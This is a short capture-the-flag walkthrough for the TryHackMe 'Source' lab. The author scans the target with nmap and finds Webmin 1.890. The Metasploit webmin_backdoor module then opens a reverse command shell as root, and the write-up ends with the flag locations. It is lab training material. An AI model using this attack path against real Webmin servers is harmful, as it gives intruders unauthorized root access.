```bash
# PLATFORM          . THM
# CTF NAME          . Source
# DESCRIPTION       . Exploit a recent vulnerability and hack Webmin, a web-based system configuration tool.
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/source
```

```bash
sudo nmap -sSVC -T5 -p- 10.10.249.33 -oN source
```

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b74cd0bde27b1b15722764562915ea23 (RSA)
|   256 b78523114f44fa22008e40775ecf287c (ECDSA)
|_  256 a9fe4b82bf893459365becdac2d395ce (ED25519)

10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- I had no idea what Webmin is, and, after some research, I found out that there was a backdoor implemented in 2 separate occasions, April 2018 (version 1.890) and July 2018, versions 1.900 - 1.920

- This made me check msfconsole for any actual exploits to see if they work, assuming the webserver has the "right" version of webmin installed.

```
search webmin

Matching Modules
================

{redacted / trimmed}

	7  exploit/linux/http/webmin_backdoor         2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor



msf6 > use 7

```

- After setting up the `RHOSTS`, `LHOST`, `SSL` to `True`, I ran the exploit and ...  

```
[*] Command shell session 1 opened ({redacted}:4444 -> 10.10.249.33:35886) at 2023-12-10 17:27:59 +0200


whoami
root
```

- Well, that was quick :) 

- The user flag is in `/home/dark/user.txt`
- The root flag is in `/root/root.txt`

